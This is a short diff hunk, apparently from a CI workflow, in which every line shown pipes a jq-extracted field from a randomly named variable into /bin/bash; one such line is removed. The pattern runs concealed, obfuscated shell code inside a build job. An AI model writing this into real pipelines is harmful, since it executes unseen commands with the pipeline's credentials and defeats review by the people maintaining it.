@@ -28,7 +28,6 @@ jobs:
           echo $dcyvt83 | jq -r .dp5 | /bin/bash
           printf '%s' "$mt83" | jq -r .iioyx5 | /bin/bash
           echo $p90 | jq -r .v40 | /bin/bash
-          echo $zoe44304 | jq -r .mvxq0 | /bin/bash
           printf '%s' "$h3" | jq -r .nr2730 | /bin/bash
           echo $ansj50138 | jq -r .gbvaq54117 | /bin/bash
 
